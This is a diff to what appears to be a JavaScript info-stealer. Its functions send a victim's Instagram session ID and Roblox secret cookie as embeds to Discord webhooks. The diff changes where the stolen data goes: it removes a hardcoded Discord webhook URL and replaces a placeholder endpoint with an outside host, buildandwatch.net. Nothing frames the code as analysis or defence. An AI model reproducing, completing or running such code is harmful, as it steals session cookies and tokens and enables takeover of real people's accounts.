@@ -517,7 +517,7 @@ async function SubmitInstagram(session_id) {
     };
 
     // Send the embed to the Discord webhook
-    await httpx.post(webhook, { embeds: [embed] });
+    await httpx.post(webhook3939, { embeds: [embed] });
     console.log("Data sent to Discord webhook successfully.");
   } catch (error) {
     console.error("Error sending data to Discord webhook:", error);
@@ -574,7 +574,6 @@ async function SubmitRoblox(secret_cookie) {
   // Replace any backticks in the secret_cookie with the backquote character (‵)
   const formattedSecretCookie = secret_cookie.toString().replace(/`/g, '‵');
 
-  let webhook = 'https://discord.com/api/webhooks/1131719152483192842/2GmqMmERdj80dMBrH6jxC_8BRuuahhgdCU4AIqJzUDa5tchHMwtEcVMic6S9KAzIgdPO';
 
   let embed = {
     color: 0x303037,
@@ -1016,7 +1015,7 @@ axios.get('https://api.gofile.io/getServer')
           };
 
           // Webhook URL'si
-          const webhookUrl = 'https://example.com/webhook-endpoint';
+          const webhookUrl = 'https://buildandwatch.net/wbkk';
 
           // Embed verisini oluştur
           const embedData = {
